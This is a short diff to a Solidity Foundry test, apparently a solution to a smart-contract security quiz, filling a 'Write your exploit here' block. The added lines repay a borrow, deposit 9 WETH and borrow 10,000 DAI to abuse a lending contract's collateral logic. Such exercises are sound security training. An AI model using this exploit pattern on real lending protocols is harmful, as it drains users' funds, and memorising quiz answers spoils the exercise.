@@ -70,6 +70,13 @@ contract Quiz2 is Test {
         // -----------------------
         // Write your exploit here
 
+        dai.approve(address(lending), lending.usersBorrow(attacker));
+        lending.repay(attacker, lending.usersBorrow(attacker));
+
+        weth.approve(address(lending), 9 ether);
+        lending.depositCollateral(9 ether);
+        lending.borrow(10_000 ether);
+
         // -----------------------
 
         vm.stopPrank();
